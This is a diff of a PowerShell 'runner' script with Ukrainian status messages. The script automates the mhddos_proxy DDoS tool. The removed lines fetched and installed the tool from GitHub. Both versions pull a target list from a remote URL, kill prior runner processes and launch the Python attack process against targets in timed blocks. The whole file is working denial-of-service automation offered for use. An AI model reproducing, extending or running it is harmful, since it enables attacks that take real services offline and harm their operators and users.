@@ -1,22 +1,17 @@
-#Requires -Version 7
 [console]::TreatControlCAsInput = $true
 $host.UI.RawUI.BackgroundColor = [ConsoleColor]::Black
 $host.UI.RawUI.ForegroundColor = [ConsoleColor]::Green
-$ErrorActionPreference = "SilentlyContinue";
-$ProgressPreference = "SilentlyContinue";
-$WarningPreference = "SilentlyContinue";
 
 [xml]$XMLConfig = Get-Content -Path ("settings.xml");
-
+$ActionPreference = $XMLConfig.config.erroraction;
+$ErrorActionPreference = $ActionPreference;
+$ProgressPreference = $ActionPreference;
+$WarningPreference = $ActionPreference;
 .\functions.ps1
-
-$PythonPath = $PSScriptRoot + "\\Python\\";
+$PythonPath = $("$PSScriptRoot\\$($XMLConfig.config.folders.python)\\");
 $PythonExe = $PythonPath + "python.exe";
-$MhddosPath = $PSScriptRoot + "\\Mhddos_proxy\\";
-
-$mhddos_proxy_URL = 'https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git';
-$TargetsURI = 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets';
-
+$LoadPath = $("$PSScriptRoot\\$($XMLConfig.config.folders.load)\\");
+$TargetsURI = $XMLConfig.config.links.targets
 $LiteBlockSize = 50;
 $BlockSize = $LiteBlockSize * 4;
 $MinutesPerBlock = 60;
@@ -31,7 +26,8 @@ else {
 
 
 Clear-Host;
-$Banner = Get-Banner;
+$BannerURL = $XMLConfig.config.links.banner;
+$Banner = Get-Banner $BannerURL;
 Write-Host $Banner;
 $StartupMessage = "Бігунець версії $RunnerVersion"
 if ($RunningLite) {
@@ -40,34 +36,11 @@ if ($RunningLite) {
 Clear-Line $StartupMessage;
 Set-Location $PSScriptRoot;
 
-if (Test-Path $MhddosPath) {
-    $Runners = Get-ProcCmdline "$MhddosPath"
-    if ($Runners.Count -gt 0) {
-        while (($null -ne $Runners) -and ($Runners.Count -gt 0)) {
-            foreach ($LockingID in $Runners) {
-                Stop-Tree $lockingID
-            }
-            $RunnerProc = Get-Process | `
-                Where-Object { $_.Path -like $PythonExe } | `
-                Select-Object -ExpandProperty ProcessId
-            foreach ($LockingID in $RunnerProc) {
-                Stop-Tree $lockingID
-            }
-            $Runners = Get-CimInstance win32_process | `
-                Where-Object { $_.CommandLine -like "*$MhddosPath*" } | `
-                Select-Object -ExpandProperty ProcessId
-        }
-    }
+$Runners = Get-ProcByCmdline "$LoadPath"
+$Runners += Get-ProcByPath "$PythonExe"
+foreach ($ProcessID in $Runners) {
+    Stop-Tree $ProcessID
 }
-Clear-Line "Отримуємо найновішу версію mhddos_proxy...";
-$GitArgs = "update $mhddos_proxy_URL $PSScriptRoot";
-Start-Process -FilePath $GitExe -ArgumentList $GitArgs -Wait -WindowStyle Hidden;
-Set-Location $MhddosPath;
-Clear-Line "Встановлюемо необхідні модулі...";
-$PyArgs = "-m pip install --upgrade pip";
-Start-Process -FilePath $PythonExe -ArgumentList $PyArgs -Wait -WindowStyle Hidden;
-$PyArgs = "-m pip install -r requirements.txt";
-Start-Process -FilePath $PythonExe -ArgumentList $PyArgs -Wait -WindowStyle Hidden;
 
 Clear-Line "Отримуємо список цілей...";
 $TargetList = Get-Targets $TargetsURI $RunningLite;
@@ -107,6 +80,13 @@ while (-not $StopRequested) {
                 Stop-Tree $PyProcess.Id;
                 Clear-Line "Відпрацювали $($Target.Count) цілей. Беремо наступний блок";
             }
+        }
+    }
+    if (!$RunningLite) {
+        $Now = [System.DateTime]::Now;
+        $StopCycle = $Now.AddMinutes($MinutesPerBlock);
+        while ($([System.DateTime]::Now) -lt $StopCycle) {
+            
         }
     }
 }
